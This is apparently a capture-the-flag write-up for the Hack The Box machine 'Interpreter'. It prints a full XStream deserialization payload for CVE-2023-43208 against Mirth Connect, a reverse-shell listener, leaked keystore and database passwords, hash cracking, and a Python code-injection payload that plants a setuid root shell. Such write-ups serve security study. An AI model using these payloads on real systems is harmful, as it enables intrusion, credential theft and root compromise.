---
tags:
permalink: /Interpreter-HTB-Writeup
title: Interpreter - Medium (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
zs1n$ nmap -sCV -p22,80,443,6661 10.129.244.184 -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 09:18 -0500
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.02% done; ETC: 09:20 (0:00:01 remaining)
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.20% done; ETC: 09:20 (0:00:01 remaining)
Nmap scan report for 10.129.244.184
Host is up (0.82s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
443/tcp  open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
6661/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.44 seconds
```

![[Pasted image 20260223120952.png]]

https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT

```bash
 curl -k -X POST "https://10.129.244.184:443/api/users" \
     -H "User-Agent: Mozilla/5.0" \
     -H "X-Requested-With: OpenAPI" \
     -H "Content-Type: application/xml" \
     --data-binary @exploit.xml
```


```xml
<sorted-set>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string>ping -c 4 10.10.17.19</string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

```bash
sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:31:17.093719 IP interpreter.htb > 10.10.17.19: ICMP echo request, id 3965, seq 1, length 64
09:31:17.093844 IP 10.10.17.19 > interpreter.htb: ICMP echo reply, id 3965, seq 1, length 64
09:31:18.091733 IP interpreter.htb > 10.10.17.19: ICMP echo request, id 3965, seq 2, length 64
09:31:18.091755 IP 10.10.17.19 > interpreter.htb: ICMP echo reply, id 3965, seq 2, length 64
09:31:19.431286 IP interpreter.htb > 10.10.17.19: ICMP echo request, id 3965, seq 3, length 64
09:31:19.431326 IP 10.10.17.19 > interpreter.htb: ICMP echo reply, id 3965, seq 3, length 64
09:31:20.093778 IP interpreter.htb > 10.10.17.19: ICMP echo request, id 3965, seq 4, length 64
09:31:20.093821 IP 10.10.17.19 > interpreter.htb: ICMP echo reply, id 3965, seq 4, length 64
```

```bash
 sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.244.184] 34032
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

```bash
</drivers>mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS
```

```bash
# database credentials
database.username = mirthdb
database.password = MirthPass123!
```

```bash
Database changed
MariaDB [mc_bdd_prod]> show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from person
    -> ^C
MariaDB [mc_bdd_prod]> select * from person
    -> select * from person^C
MariaDB [mc_bdd_prod]> select * from person;
ERROR 1146 (42S02): Table 'mc_bdd_prod.person' doesn't exist
MariaDB [mc_bdd_prod]> select * from PERSON;
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.000 sec)
```

```bash
echo "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==" | base64 -d | xxd -p -c 64
bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

```bash
j pass
Using default input encoding: UTF-8
Loaded 1 password hash (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 600000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snowflake1       (?)
1g 0:00:01:37 DONE (2026-02-23 09:48) 0.01021g/s 104.5p/s 104.5c/s 104.5C/s 12345b..1asshole
Use the "--show --format=PBKDF2-HMAC-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

```bash
sedric@interpreter:~$ cat user.txt
eaa62d8bbb001aef1827cbfaff407022
```

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root sedric 33 Feb 23 09:18 /home/sedric/user.txt
-rwxr----- 1 root sedric 2332 Sep 19 09:27 /usr/local/bin/notif.py
```

```bash
/home/sedric/.lesshst
```

```bash
2026/02/23 10:01:46 CMD: UID=0     PID=3550   | /usr/bin/python3 /usr/local/bin/notif.py
```

```bash
curl -X POST http://127.0.0.1:54321/addPatient \
     -H "Content-Type: application/xml" \
     --data-binary '<patient><firstname>Test</firstname><lastname>User</lastname><sender_app>Mirth</sender_app><timestamp>123</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>'
Patient Test User (M), 26 years old, received from Mirth at 123 
```

```bash
curl -X POST http://127.0.0.1:54321/addPatient \
     -H "Content-Type: application/xml" \
     --data-binary '<patient><firstname>{__import__("os").system("cp"+chr(32)+"/bin/bash"+chr(32)+"/tmp/rootbash")}</firstname><lastname>{__import__("os").system("chmod"+chr(32)+"+xs"+chr(32)+"/tmp/rootbash")}</lastname><sender_app>Mirth</sender_app><timestamp>123</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>'
```

```bash
sedric@interpreter:/tmp$ ls /tmp/rootbash
/tmp/rootbash
sedric@interpreter:/tmp$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(sedric) gid=1000(sedric) euid=0(root) egid=0(root) groups=0(root),1000(sedric)
```

```bash
rootbash-5.2# cat root.txt
89dac97aa252a23d564542d47245e980
```